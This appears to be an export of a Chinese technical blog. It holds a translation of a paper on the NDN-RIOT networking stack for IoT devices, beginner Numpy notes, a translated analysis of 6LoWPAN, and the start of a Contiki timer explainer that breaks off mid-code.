命名数据网络（NDN），是以网络通信模式从主机为中心（以TCP/IP）向数据为中心的信息中心网络（ICN）模式的实现。在NDN中，每条数据都有一个独特的，分层结构的名称，由应用程序用来检索数据。数据消费者通过发送携带数据名称（或其前缀）的兴趣数据包来请求所需数据。网络根据兴趣包名称转发兴趣数据包，并使用 Interest Forwarding Strategy（兴趣包转发策略）。转发策略从转发信息库（FIB）获取关于数据潜在位置的输入，并利用数据平面性能测量来调整转发决策[8]。随着兴趣包的转移，沿途的每个路由器在其待定兴趣表（PIT）记录兴趣来自的接口。 一旦兴趣在原始生成者或转发器的缓存（称为内容存储或CS）中找到所请求的数据，则通过使用路由器中剩余的跟踪来反向兴趣包转发路径，将数据包返回给用户。每个数据包都带有安全地绑定名称和内容的加密签名，允许消费者对数据进行身份验证，而不管从哪里检索。因此，NDN网络可以利用各种类型的数据存储（诸如网络内缓存和专用回收）来提高通信的效率。 RIOT-OS RIOT是一个跨平台的操作系统，为具有10kb RAM和闪存的受限的物联网设计的设备而设计。它为应用开发人员提供了各种IoT硬件和C（C99兼容）编程环境的细节的清晰统一的抽象，并全面支持C标准库。对C++和STL库也有有限的支持。RIOT-OS微内核提供核心功能，如多线程，基于优先级的调度，中断处理和进程间通信（IPC）接口。它目前包括用于以太网和IEEE 802.15.4网络接口的驱动程序，以及各种外设IoT传感器和执行器。它还具有对与IoT相关的网络协议（如IPv6，UDP，6LoWPAN，RPL，CoAP等）的内置支持。自2013年初步发布以来，RIOT-OS已经移植到具有不同CPU架构的多个IoT平台上，包括ARMv7，ARM Cortex-M0 +，MSP430，并在IoT社区中迅速普及。 NDN-RIOT设计目标 NDN-RIOT实现的主要目的是支持核心NDN转发操作和和与当前协议规范的兼容性，目标设备具有10KB RAM（用于存储运行时数据）、100KB的闪存（适用于存储二进制可执行代码），低功耗CPU以小于100MHz的频率运行。这要求NDN-RIOT实现底层数据结构（PIT，FIB，CS）的简化版本，以适应约束参数，支持转发机制的大部分核心要求。第二个但不是同样重要的目标是通过为数据为中心的安全原语提供固有支持的高级API来促进基于NDN的安全应用程序的开发。 软件体系结构 RIOT-OS使用微内核架构，网络协议模块（例如，IPv6和UDP）被实现为内核线程，并且跨层的数据包通过不同模块之间的IPC实现。NDN-RIOT堆栈以相同的方式实现，如图1所示。当应用程序想要发送NDN数据包时，它会在IPC调用中将数据包传递给NDN线程;NDN线程处理数据包，然后将其传递给网络设备驱动程序线程进行传输。当网络设备驱动程序接收到包含NDN数据包的二层帧时，它将数据包传递给NDN线程，NDN线程通知应用程序和/或进一步传播数据包。 分组编码和解码 为了支持受限制的存储器资源有限的设备，我们仔细设计了分组编码和解码程序，以最小化内存中数据包的份数。我们做出的一个重要的设计决策是在系统的整个生命周期中以有线格式形式存储NDN数据包，并根据需要访问底层元素，例如访问名称字段来决定在哪里转发兴趣或访问签名字段数据包认证。这样，我们通过不使用反序列化数据包来节省内存和CPU周期，每次访问数据包时支付额外的CPU处理价格。幸运的是，正如我们在第四部分中演示的，解析TLV格式的NDN数据包通常是非常有效的 为了简化内存管理和所有者跟踪，我们实现了一个轻量级的共享内存块结构（由C++11中的共享指针机制启发），用于存储TLV编码的NDN名称，兴趣和数据。它允许我们最大程度地跨系统模块共享公共数据，而不用担心潜在的内存泄漏。 安全支持 数据安全是物联网应用的关键要求之一。然而，由于CPU和内存资源有限，受限制的IoT设备对它们可以支持哪些加密操作有限制。尽管如此，在RIOT-OS提供的哈希API和第三方micro-ecc库[10]的帮助下，我们能够实现两种实际的数据签名方法：HMAC和ECDSA，都使用SHA-256哈希功能。我们的实现使用标准secp256r1曲线[11]为ECDSA签名长度为64字节。不支持RSA签名算法，因为它的计算成本过高。 实施ECDSA支持时我们遇到的一个特别的挑战是，许多受约束的IoT设备缺少硬件熵源，这对于在ECDSA签名过程中使用的密码安全随机数来说是必需的。使用没有强大熵源的伪随机数发生器（PRNG）显着损害了ECDSA签名的强度。作为当前的解决方案，我们采用了确定性的ECDSA签名[12]，在生成签名时不使用真正的随机数。然而，创建ECDSA密钥对仍然需要密码较强的随机数。实现此目的的一个方法是让RIOT-OS上的生产者应用程序使用在其他平台上创建的ECDSA密钥并传输到IoT设备。导出和配置ECDSA密钥的详细机制正在开发中，将在NDN-RIOT文档中进行描述。 分组转发 为了支持NDN分组转发逻辑，NDN-RIOT包括PIT，FIB和CS数据结构的简化版本。为了最小化内存开销，所有三个数据结构都被实现为简单的链表，因为我们预期约束设备上的条目数量少（低于100）。当前数据包处理不支持兴趣包选择器，并且只使用兴趣和数据名称执行所有查找。该实现也不支持使用包含隐式摘要组件的全名检索数据，因为IoT应用程序主要用于检索与全名数据检索不兼容的数据样本和处理命令。 PIT使用兴趣名称的完全匹配和数据名称的任何前缀匹配（即，数据包将匹配名称与数据名称更短或相同的任何PIT条目）。简化的PIT条目仅记录兴趣的传入面。在转发期间，使用PIT状态来防止潜在的循环，而不使用随机机制。 FIB表使用兴趣名实现最长前缀匹配，并存储未分配的faces数组，可以通过静态配置或在运行时使用简单的基于IPC的机制进行配置。后者目前仅适用于本地应用程序前缀注册。路由信息（主动或点播）传播到远程节点，特别是通过无线网状网络，可供我们今后的工作使用。动态FIB配置的其他基于IPC的机制也是我们未来计划的一部分。 CS使用预配置的最大大小（当前编译时可调整默认值为24KB），并实现简单的FIFO缓存驱逐策略。 二层通信 RIOT-OS目前支持两种类型的二层协议：以太网（由仿真器使用）和IEEE 802.15.4（在实际设备上）。通过以太网发送NDN报文时，网络设备驱动程序将目标MAC地址设置为广播地址（FF:FF:FF:FF:FF:FF）。以太网报头还携带NDN的IEEE 802协议号，使报文接收者可以检测报文的类型，并将报文发送到NDN线程。当通过IEEE 802.15.4链路进行操作时，设备调谐到所选择的无线信道（由信道ID号码（例如26）和个人区域网络（PAN）标识）（由PAN ID（例如，0x23标识））并使用广播目的地址（FF:FF）。 大多数受限制的网络具有非常有限的MTU，通常小于100字节。虽然针对受限环境优化的IoT应用程序应尽量避免使用大数据包，但是要求所有应用程序始终发送适合网络MTU的NDN数据包过于限制。因此，我们还为NDN-RIOT设计了一个轻量级的逐跳L2分段和重组机制。图2显示了如果需要L2分段，则前缀到NDN数据包的每个片段的3字节分片头的格式。标题格式通过将所有信息打包成24位来对受限环境进行优化。标题的第一位设置为1表示数据包被分段。未分片的数据包将以兴趣（5）或数据（6）数据包的类型代码开始，最高位位始终为0。更多分段（MF）位指示当前数据包是否是最后一个片段。序列号（SEQ）和识别字段提供片段的排序，由接收器使用它们来重新组合原始的NDN包。 应用程序接口 我们实现了一套高级应用程序接口，可以抽象出应用程序线程和NDN堆栈之间的内部通信机制。这些API提供了现有NDN客户端库中广泛采用的异步通信模型，如NDN.JS[13]和ndn-cxx[14]。在这种模式下，应用程序运行一个事件循环，在单个线程上调度I/O事件（例如，数据包接收，定时器到期等），并调用相应的回调来处理这些事件。应用程序还可以在不同的线程中创建多个运行循环来安排不同的任务。表I显示了NDN应用程序中经常使用的核心API。 我们在Listings 1和2中说明了API的用法，它们分别显示了基本的消费者和生产者应用程序的代码。由于空间限制，我们省略了所有错误检查代码和启动应用程序的主要功能。完整的源代码可以在[7]找到。 评估 在本节中，我们介绍我们从真实的IoT设备收集的评估结果。我们专注于两个主要方面，内存使用和执行速度，对于在受限设备上运行的软件系统至关重要。我们的基准代码是使用基于GCC版本4.9.3的Ubuntu 16.04上的GCC ARM Embedded工具链编译的。我们遵循RIOT-OS代码库的默认GCC设置，它使用了2级优化（-O2）。 我们对两个不同的物联网平台进行评估： SAMR21-XPRO：由Atmel生产的IoT评估板，它具有32位ARM Cortex-M0 + 48 MHz微控制器（MCU），32KB嵌入式RAM和256KB嵌入式闪存以及2.4 GHz IEEE 802.15.4兼容无线射频接口。 IoTLab-M3：为FIT IoTLab设计的IoT板[17]，它具有32位ARM Cortex-M3 72 MHz MCU，64KB嵌入式RAM和512KB嵌入式闪存，以及与SAMR21-XPRO类似的无线接口。 内存使用 我们通过检查为两个平台编译的二进制对象代码来测量RIOT-OS的NDN应用程序的内存使用情况。我们使用GNU readelf工具来获取每个API函数的代码大小，以及GNU大小的工具，从第三部分G中所示的基本的消费者和生产者实例的可执行文件中获取总代码大小和静态内存使用情况。 表II列出了NDN-RIOT中核心API的目标代码大小。第二列显示了基于ARMv6-M指令集架构（ISA）的针对ARM Cortex-M0 + MCU编译的API的大小。第三列显示了基于ARMv7-M ISA的ARM Cortex-M3 MCU编译的API的大小。这两种架构都支持Thumb指令集，其中16位/32位编码，导致与目标代码相似的大小。 表III显示了Listings 1和2中绘制的基本的消费者和生产者示例的GNU size命令的输出。两个示例的源代码具有大致相同的结构，因此在编译后导致类似的代码大小。表中最后两列显示驻留在Flash和RAM中的静态内存总量。在具有32KB RAM的设备上，静态数据占用大约11KB的嵌入式RAM，留下21KB进行动态分配，用于创建PIT，FIB和CS条目，为NDN数据包创建共享内存块，并存储运行时生成的动态用户数据。 表现 为了衡量系统的运行时性能，我们首先通过一组基准来分析各个API的执行速度，然后将应用级RTT显示为综合NDN-IoT系统性能的指标。我们没有测量最大的网络吞吐量，因为在受限设备上运行的大多数IoT应用程序不需要高吞吐量数据传输。 （1）API执行速度：我们通过重复调用函数来测量NDN API的执行时间，并将总运行时间除以迭代次数。结果在表IV中以实时和MCU周期的形式呈现在MCU之间进行比较。由于基准套件作为接管整个MCU的单线程应用程序运行，测量结果在不同运行中相当稳定。 总结，在具有48 MHz MCU的SAMR21-XPRO上，NDN-RIOT能够在一秒钟内创建5434个NDN名称（来自URI字符串），40000个兴趣或553个HMAC签名数据。最昂贵的操作是创建和验证ECDSA签名的数据包。 SAMR21-XPRO可以创建和验证每秒2个具有ECDSA签名的数据包。在IoTLab-M3（72 MHz MCU）上，性能提高到每秒3.5-3.7个数据包，尽管它比使用HMAC还要低150倍。 （2）应用程序级别的往返时间：我们的最终评估测量两台RIOT-OS设备之间的兴趣-数据交换的RTT。实验在巴黎的FIT IoTLab测试台[17]进行，两个IoTLab-M3节点通过IEEE 802.15.4无线电通信。测试台网络的MTU为102字节，固定数据速率为250Kbps。测量在两个场景下执行，数据包大小为100字节和196字节。在每种情况下，我们测量获取生产者根据请求生成的新数据包的RTT，从远程缓存获取数据包，和从本地缓存获取数据包。每个实验执行100次Interest-Data交换而不进行流水线计算，RTT计算为总运行时间除以100。所有数据包都由ECDSA签名。 表V显示了RTT测量结果。当获取新创建的数据时，RTT由ECDSA签名操作（大约需要270ms）来支配。当获取196个字节的数据包时，该数据包在生产者处被分成两部分，并在消费者节点重新组合，并且由于分段和重新组装操作，RTT显示≈6ms的附加延迟。从本地缓存中获取数据时，在任何一种情况下都不需要分片，平均响应时间小于1ms。 测试台环境中两台RIOT-OS设备之间的IP数据包的平均RTT范围为5到9 ms，由RIOT-OS内核中的ping实用程序测量。因此，我们的初始实现的兴趣数据RTT尚未被微调，与IP相比没有数据签名延迟。然而，我们注意到前者可以表达高级语义并直接将数据送到应用程序，而IP数据包必须经过附加层协议处理才能到达应用程序，如[18]所述。 相关的工作 嵌入式系统的传统轻量级网络堆栈实现基于TCP/IP架构。最流行的实现之一是lwIP[19]软件包，在具有数十KB RAM和闪存的器件上提供全功能标准兼容的TCP/IP功能。lwIP可以在不同的平台上运行，包括基于RIOT-OS的IoT系统。RIOT-OS还具有自己的基于IPv6的网络堆栈，通过结合与IoT相关的协议和框架（如CoAP，RPL和6LoWPAN）来支持IoT应用程序。NDN-RIOT遵循RIOT-OS中IP堆栈的相同软件架构，以实现与RIOT-OS内核的良好集成。 CCN-lite[20]是CCN的通用轻量级实现[1]，已被移植到RIOT-OS作为第三方包[21]。CCN-Lite被设计为可以在不同平台上运行并支持多种ICN协议格式的通用CCN堆栈。我们的NDN-RIOT实现是用于IoT应用程序和RIOT-OS平台的NDN堆栈的优化版本。因此，我们的实现可以充分利用RIOT-OS内部API并删除冗余功能。更重要的是，我们的NDN API提供了数据安全支持，这对于IoT应用程序至关重要，但目前在CCN-lite实现中缺少。 总结与展望 我们实现NDN-RIOT，一个用于RIOT-OS的轻量级NDN协议栈，它展示了将NDN以数据为中心的通信和安全模型引入受约束的IoT平台的可行性，为开发比TCP/IP更为全面的IoT应用提供了坚实的基础。然而，它只是朝向支持NDN的IoT应用程序的第一步，还有几个重要领域尚待探索。 首先，我们需要对RIOT-OS上的NDN协议操作相关的能耗进行全面的调查。另外，我们需要向NDN-RIOT添加一个与转发策略进行交互的接口，然后由IoT应用来实现能量感知分组转发策略和其他功能。第三，我们还计划对目前已经确定的实现进行多项改进，包括扩展兴趣包流水线操作和自动重传等传输层功能API和通过微型基准扩展性能优化。此外，我们计划在NDN-RIOT之上设计高级框架，如自动配置和发现，以促进物联网应用。我们邀请更广泛的社区加入我们，探索这个令人兴奋的物联网研究领域。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>RIOT-OS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Numpy学习笔记（一）]]></title>
    <url>%2F2017%2F04%2F14%2FPython-Numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Python科学计算库：Numpy。本博客简单介绍了Numpy的安装，主要介绍了Numpy提供的数组对象ndarray的创建、属性与数据类型。 简介 Numpy是Python的一个开源科学计算的库，提供了矩阵运算的功能，其一般与Scipy、matplotlib一起使用。 NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray(下文统一称之为数组)是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。 安装1pip install numpy 测试12import numpy as npprint np.version.version ndarrayndarray是一个多维数组对象，由两部分构成： 实际的数据 描述这些数据的元数据（数据维度、数据类型等） ndarray数组一般要求所有元素类型相同（同质），数组下标从0开始 在NumPy中数组的维度(dimensions)叫做轴(axis)，轴的个数叫做秩(rank)。 创建ndarray 从Python中的列表、元组等类型创建ndarray数组 可以使用np.array()方法将Python列表或元组转化为数组，转化后的数组元素的类型由原来的对象的类型来决定。 （1）一维数组 123&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; np.array((1, 2, 3, 4)) #从元组创建array([1, 2, 3, 4]) （2）多维数组 123456&gt;&gt;&gt; np.array([[1, 2, 3, 4],[5, 6, 7, 8]]) #从列表创建array([[1, 2, 3, 4], [5, 6, 7, 8]])&gt;&gt;&gt; np.array([[1, 2, 3, 4],(5, 6, 7, 8)]) #从列表和元组混合类型创建array([[1, 2, 3, 4], [5, 6, 7, 8]]) 当np.array()不指定dtype时，NumPy将根据数据情况关联一个dtype类型。 使用NumPy中函数创建ndarray数组，如：arange, ones, zeros等 函数 说明 np.arange(n) 类似range()函数，返回ndarray类型，元素从0到n‐1 np.ones(shape) 根据shape生成一个全1数组，shape是元组类型 np.zeros(shape) 根据shape生成一个全0数组，shape是元组类型 np.full(shape,val) 根据shape生成一个数组，每个元素值都是val np.eye(n) 创建一个正方的n*n单位矩阵，对角线为1，其余为0 np.ones_like(a) 根据数组a的形状生成一个全1数组 np.zeros_like(a) 根据数组a的形状生成一个全0数组 np.full_like(a,val) 根据数组a的形状生成一个数组，每个元素值都是val np.linspace() 根据起止数据等间距地填充数据，形成数组 np.concatenate() 将两个或多个数组合并成一个新的数组 12345678910111213141516171819202122&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; np.arange(6)array([0, 1, 2, 3, 4, 5])&gt;&gt;&gt; np.ones(6)array([ 1., 1., 1., 1., 1., 1.])&gt;&gt;&gt; np.zeros((3,2))array([[ 0., 0.], [ 0., 0.], [ 0., 0.]])&gt;&gt;&gt; np.full((2,2),6)array([[6, 6], [6, 6]])&gt;&gt;&gt; np.eye(3) array([[ 1., 0., 0.], [ 0., 1., 0.], [ 0., 0., 1.]])&gt;&gt;&gt; a = np.array([[1,2],[2,1]]) &gt;&gt;&gt; np.ones_like(a) #生成一个与a数组相同结构的全1数组array([[1, 1], [1, 1]])&gt;&gt;&gt; np.linspace(1, 10, 6) # 1为起始数，10为终止数，6为数的个数array([ 1. , 2.8, 4.6, 6.4, 8.2, 10. ]) ndarray的属性 shape：一个说明ndarray对象各维度大小的元组 对一个n 行m 列的矩阵来说，shape为 (n,m)。 1234567891011121314151617&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; c = np.array([1, 2, 3, 4])&gt;&gt;&gt; c.shape(4,)&gt;&gt;&gt; c.shape = 2, 2&gt;&gt;&gt; carray([[1, 2] [3, 4]])&gt;&gt;&gt; k = c.reshape(4,)&gt;&gt;&gt; karray([1, 2, 3, 4])&gt;&gt;&gt; k[0] = 0&gt;&gt;&gt; karray([0, 2, 3, 4])&gt;&gt;&gt; carray([[0, 2] [3, 4]]) 使用数组的reshape方法，可以创建一个改变了尺寸的新数组，原数组的shape保持不变。 注意：k与c共享内存区域，所以修改其中任意一个数组的元素都会同时修改另外一个数组的内容。 dtype：ndarray对象的元素类型 数组的元素类型可以通过dtype属性获得，可以通过dtype参数在创建时指定元素类型。 类型可以是 numpy.int32, numpy.int16, and numpy.float64 等。 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.dtypedtype(&apos;int32&apos;) 创建数组时也可以指定元素的数据类型: 123&gt;&gt;&gt;np.array([[1,2,3,4],[5, 6, 7, 8]], dtype = np.float)array([[ 1., 2., 3., 4.], [ 5., 6., 7., 8.]]) ndim：数组的维数，也称为rank(秩) 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.ndim2 size：ndarray对象元素的个数 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.size8 itemsize：ndarray对象中每个元素的大小，即占用的字节数。 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.itemsize4 data：指向数据内存。 123&gt;&gt;&gt; c = np.array([[1, 2, 3, 4],[5, 6, 7, 8]])&gt;&gt;&gt; c.data&lt;read-write buffer for 0x02D89E30, size 32, offset 0 at 0x02CE7DE0&gt; ndarray的数据类型 Python语法仅支持整数、浮点数和复数3种类型，而ndarray支持多种数据类型，这也正是其用于科学计算的强大之处。 类型 说明 bool 布尔类型，True或False intc 与C语言中的int类型一致，一般是int32或int64 intp 用于索引的整数，与C语言中ssize_t一致，int32或int64 int8 字节长度的整数，取值：[‐128, 127] int16 16位长度的整数，取值：[‐32768, 32767] int32 32位长度的整数，取值：[‐2^31,2^31‐1] int64 64位长度的整数，取值：[‐2^63,2^63‐1] uint8 8位无符号整数，取值：[0, 255] uint16 16位无符号整数，取值：[0, 65535] uint32 32位无符号整数，取值：[0,2^32‐1] uint64 32位无符号整数，取值：[0,2^64‐1] float16 16位半精度浮点数：1位符号位，5位指数，10位尾数 float32 32位半精度浮点数：1位符号位，8位指数，23位尾数 float64 64位半精度浮点数：1位符号位，11位指数，52位尾数 complex64 复数类型，实部和虚部都是32位浮点数 complex128 复数类型，实部和虚部都是64位浮点数]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]The analysis of 6LowPAN technology]]></title>
    <url>%2F2017%2F04%2F09%2F%E8%AF%91-The-analysis-of-6LowPAN-technology%2F</url>
    <content type="text"><![CDATA[The analysis of 6LowPAN technology（全文翻译） 6LoWPAN技术分析 123456The analysis of 6LowPAN technologyXin Ma, Wei LuoThe Key Laboratory of Network Control Technology and Intelligent InstrumentChongqing University of Posts and TelecommunicationsChongqing 400065, Chinathincucumber@126.com, weiweiopiu@163.com 摘要：IPv6 over IEEE802.15.4（又称6LoWPAN）已经成为低速无线个域网标准（LR-WPAN）。IPv6作为IEEE 802.15.4设备在网络层的互连方案，6LoWPAN技术受到广泛关注。本文介绍了IEEE802.15.4标准和6LoWPAN技术，讨论了6lowpan的优点，分析了其关键技术，并探讨了6LoWPAN的应用。 引言 近来，低速无线个域网已经成为一个热点问题，并且如何整合IPv6与LR-WPAN也成为一个重要的问题。LR-WPAN是一个通信网络，用于有限的功率和松散的吞吐量要求。它包含符合IEE 802.15.4标准的设备，并具有短距离、低比特率、低功耗和低成本的特征。这些设备协同工作，将物理环境连接到现实世界的应用，例如无线传感器网络和工业无线。 但是，IEEE 802.15.4只规定了物理层和数据链路层的标准，没有涉及网络层以上的标准。为了实现网络设备和不同设备的协同工作，有必要在网络层建立统一的标准。由于地址空间和大尺度的开放性，由IETF正式建立6LoWPAN(IPv6 over Low-rate WPAN)工作组来建立基于IPv6的LR-WPAN标准，工作组的目标是将IPv6引入采用IEEE 802.15.4作为基础底层标准的LR-WPAN。2007年9月发布的WirelessHART通信标准包含6LoWPAN技术，并且ISA100.11a网络层也是基于6LoWPAN标准为每个无线现场设备提供IPv6连接。6LoWPAN通过压缩IPv6数据包，有助于通过802.15.4兼容吞吐量和电池限制设备进行IPv6连接。 IEEE 802.15.4标准 IEEE 802.15.4工作组成立于2000年12月，它致力于为固定/移动设备定义一种低成本、便携式无线网络接入技术。这个工作组公布了IEEE 802.15.4标准，它规定了WPAN的物理层和MAC层，只需要802.11 1%的能量，更容易嵌入，容易使用。如图1所示的体系结构。 IEEE 802.15.4标准的主要特点包括： （1）低速率：868/915MHz的物理支持超过20kb/s,40kb/s的空气数据速率，任选100kb/s和250KB/。2450 MHz PHY支持250kb/s的数据速率。物理层选择取决于当地法规和用户的喜好。 （2）低功耗：使用小电池可以工作数月甚至数年。 （3）低成本：通常采用低端、硬件资源有限的嵌入式设备。 （4）短距离：信号覆盖范围从10m到100m （5）多种类型：设备一般包括全功能设备（FFD）和精简功能设备（RFD）。FFD包含包括协调器和路由器，协调器可以形成网络和路由数据包，路由器路由数据包，但可以有额外的功能。RFD是功能有限的终端设备，大部分时间都是睡眠的。 （6）多种模式：MAC层定义两种传输模式，一种是启用信标的模式，另一种是不启用信标的模式。不启用信标模式的PAN使用CSMA-CA机制进行冲突避免。然而，启用信标的PAN通过超帧结构实现同步，使用基于CSMA-CA机制的时隙可以使空闲设备进入低功率睡眠状态以节省功耗。 IEEE 802.15.4定义了4种类型的帧：信标帧，MAC命令帧和数据帧、确认帧。IPv6数据包必须携带数据帧。数据帧可以可选地要求它们被确认。 IEEE 802.15.4载有关于无线电收发器的信息与Wi-Fi大致相同的频带，但使用大约1％的功率。由于这一点限制传输范围，设备的集合必须一起工作，在更长的距离和周围的障碍物上逐跳路由信息。 6LoWPAN技术6LoWPAN简介 6LoWPAN工作组工作在基于IEEE 802.15.4标准的IPv6协议栈的研究，并构建了自组织的6LoWPAN网络路由协议。它的出现推动了LR-WPAN的发展。 6LoWPAN技术底层采用PHY和MAC的IEEE 802.15.4标准，并且6LoWPAN选择IPv6作为网络层技术，其目标市场主要是无线传感器网络。 鉴于无线传感器网络的地址和安全性要求以及IPv6的进一步发展，将IPv6协议引入嵌入式设备已成为必然趋势。 但是，IPv6中的MAC支持的有效载荷长度远远大于6LowPAN底层提供的有效载荷长度，为了实现MAC层和网络层的无缝连接，6LoWPAN工作组建议在MAC层和网络层之间增加一个适配层来实现头部压缩，分片，重组和mesh路由转发。6LoWPAN协议栈的参考模型如图3所示。 6LoWPAN技术优势 6LoWPAN标准协议定义描述如何在低功耗、低数据速率、低成本的个人区域网络上利用IPv6。 （1）普及 IP网络的应用十分广泛。IPv6作为下一代互联网核心技术，也加速了它的普及速度，利用IPv6在LR WPAN会更易于接受。 （2）适用性 IP网络协议栈的结构被广泛认可，LR WPAN可以基于该结构有效地开发。 （3）更多的地址空间 IPv6在LR-WPAN应用的最大亮点是巨大的地址空间（这意味着在我们的星球每平方米大约有6.67×10^27 IPv6地址），这完全符合处理大规模、高密度的LR-WPAN设备的需要。 （4）支持无状态地址自动配置 在IPv6中，当节点开始工作时，它可以自动读取MAC地址，并根据相关规则部署IPv6地址。 （5）易于访问 LR-WPAN采用IPv6技术，这将是更容易获取其它基于IP技术的网络，充分利用IP技术的发展。 得出结论，IPv6技术在LR-WPAN中的应用具有广阔的空间，使得LR-WPAN接入Internet将大大扩展其应用，并且可以实现大规模的传感器控制网络。 6LoWPAN的核心技术 6LowPAN工作组的章程是定义如何通过IEEE 802.15.4链路进行基于IP的通信，同时符合开放标准，并确保与其他IP设备的互操作性。 6LowPAN的一些关键技术如下： （1）IPv6和IEEE 802.15.4的协调 IEEE802.15.4定义的最大帧大小为127字节，MAC头的最大长度为25字节，剩余MAC负载的最大长度为102字节。然而，在IPv6中，MAC负载的最大长度为1280字节，IEEE 802.15.4帧不能打包整个IPv6数据包。因此，有必要在IP层下面引入适配层，以实现分片和重组的功能。 （2）地址分配和地址管理 6LowPAN的一个显着特征是动态分配16位短地址的能力。通过利用这个短地址，可以采用分层路由。另外，IPv6支持无状态地址自动配置，相对于状态地址自动配置，配置费用较小，适用于LR-WPAN设备的特性。同时，LR-WPAN设备可能在人们难以到达的地方可能会大量密集地分配，所以更重要的是实现无状态地址自动配置。 （3）网络管理 网络管理技术对LR-WPAN至关重要。由于网络规模庞大，分布不均衡，LR-WPAN应具备自愈能力，要求LR-WPAN管理技术能够以极低的成本管理高密度的部署设备。6LowPAN易于在LR-WPAN中使用SNMPv3（简单网络管理协议）来进行网络管理。但是，SNMP的最初意图是管理基于IP的互联网，为了将SNMP应用于具有限制硬件资源的LR-WPAN，需要进一步的研究和改进，例如：限制数据类型，简化基本的代码规则等。 （4）安全问题 因为使用安全机制需要额外的处理和带宽资源，这不适用于LR-WPAN设备。 IEEE802.15.4在链路层提供的AES安全机制较为宽松，需要进一步加强。因此，为LR-WPAN找到合适的安全机制成为6LowPAN研究的关键问题之一。 作为信息领域的新研究热点，需要发现和研究6LowPAN的许多关键技术。例如：服务发现技术，设备发现技术，应用编程接口技术，数据融合技术等。 6LoWPAN的应用 随着LR-WPAN的快速发展和下一代互联网的广泛普及，6LoWPAN将在包括智能家居、工业无线等领域得到广泛的应用。 例如，在智能房屋中，6LoWPAN节点可以嵌入到家具或电器设备中，通过无线网络与Internet连接实现智能房屋管理。如果每个房屋安装家庭网关，几个6LowPAN节点，并将网关和每个节点上的一个无线网络传输模块（Transmitter＆Receiver，符合6LowPAN标准）连接起来。然后通过这些传输模块，可以在网关和节点之间传输各种数据，因此该智能系统可以收集电表，水煤气表的数据，自动防盗/火，自动报警，与住宅区管理中心通信等。 WirelessHART和ISA100.11a系统通过为包含：非关键监控，监控，开/闭环控制应用的无线设备提供可靠和安全的操作解决无线工业应用。 总而言之，6LowPAN的目标是以非常有限形式的设备需要具有较低数据速率的无线互联网连接的应用。6LowPAN在家庭，办公和工厂环境中的自动化和娱乐应用越来越广泛。 总结 6LoWPAN是旨在允许将IPv6数据包发送到LR-WPAN并从LR-WPAN接收的耦合，更具体地说是基于IEEE 802.15.4的网络。IPv6是有线网络-互联网的数据传输工作。同样，IEEE802.15.4设备在无线域中提供感测通信能力。 6LowPAN由于其便宜性和实用性，显示出巨大的市场前景。任何需要低价格，低功率，低功耗和密集部署等特点的设备，都可以通过6LowPAN技术实现，特别是在工业无线领域，WirelessHART和ISA100.11a标准均采用6LowPAN实现分片和重组。因此，当6LowPAN技术完全可实现和高度普及时，必将给人们的工作和生活带来极大的便利。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>6LoWPAN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki 定时器部分详解]]></title>
    <url>%2F2017%2F04%2F06%2FContiki-%E5%AE%9A%E6%97%B6%E5%99%A8%E9%83%A8%E5%88%86%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Contiki有一个clock模块和一系列timer模块：timer，stimer，ctimer，etimer，和rtimer。 contiki的定时器种类太多，在初期会让人有一种分不清的感觉。都是以timer（硬件定时器）为基础拓展成软件的定时器方式，有的以事件方式、有的以回调方式，有的通过粗精度来保证软件的低消耗，可以通过功能的划分来选择不同的定时器。 Clock模块clock.h位于contiki/core/sys。该文件为内核文件，定义了clock模块实现的接口和必要条件。 clock_init()函数 就是初始化系统时钟。 clock_time()函数 函数就是计时函数，直接返回count的值，这样就知道当前时间了。 clock_seconds()函数 函数返回以秒为单位的数值seconds。该全局变量在时钟中断函数中，每当count值为128时，都会加1，相当于每增加1都经过了1秒。 clock_delay()和clock_wait()函数 用来阻塞CPU的，但不会放弃控制权，就是平常的延时函数，有的底层驱动可能会需要。 CLOCK_SECOND宏就是一秒的宏，该宏值乘以7.8ms应该是1s，所以程序里面设置该宏值为128，这样，128 * 7.8 = 998.4≈1S。 有clock.h必有clock.c，该文件与具体的硬件平台有关，它可以位于contiki/cpu/下，也可以位于contiki/platform/下。 Timer定时器简介 Timer定时器以clock的tick作为时间精度，它是Contiki系统最基础的定时器，它使用Contiki系统时钟模块中的clock_time()函数来获取系统当前时间以便实现定时功能，等待时间到达以后触发，需要轮询调用，即应用程序必须去主动检查定时器是否过期,不能自动的的获得过期的消息。clock模块提供一些处理系统时间的函数，还有一些用来阻塞CPU的函数。 定时器API定义/home/user/contiki/core/sys/timer.h 123456789101112131415161718192021222324252627#ifndef TIMER_H_#define TIMER_H_#include &quot;sys/clock.h&quot;/** * 定义一个Timer定时器对象。定时器在使用之前必须通过timer_set()进行设置。 */struct timer &#123; clock_time_t start; clock_time_t interval;&#125;;//设置并启动一个Timer定时器对象CCIF void timer_set(struct timer *t, clock_time_t interval);//复位一个Timer定时器对象void timer_reset(struct timer *t);//重启一个Timer定时器对象void timer_restart(struct timer *t);//检查一个Timer定时器对象是否到期CCIF int timer_expired(struct timer 